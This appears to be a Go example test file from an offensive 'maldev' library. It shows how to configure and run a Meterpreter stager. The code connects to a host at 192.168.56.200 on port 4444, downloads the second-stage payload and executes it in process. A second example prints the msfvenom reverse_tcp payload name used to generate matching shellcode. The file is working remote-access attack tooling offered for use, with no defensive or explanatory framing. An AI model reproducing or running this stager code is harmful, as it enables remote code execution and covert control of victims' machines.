package meterpreter_test

import (
	"context"
	"fmt"

	"github.com/oioio-space/maldev/c2/meterpreter"
)

// Stage downloads the second-stage Meterpreter payload over the
// configured transport and executes it in-process.
func ExampleNewStager() {
	cfg := &meterpreter.Config{
		Transport: meterpreter.TCP,
		Host:      "192.168.56.200",
		Port:      "4444",
	}
	stager := meterpreter.NewStager(cfg)
	if err := stager.Stage(context.Background()); err != nil {
		fmt.Println("stage:", err)
	}
}

// PayloadName returns the msfvenom payload string matching a
// Transport — useful when generating shellcode out of band.
func ExamplePayloadName() {
	fmt.Println(meterpreter.PayloadName(meterpreter.TCP))
	// Output: windows/x64/meterpreter/reverse_tcp
}
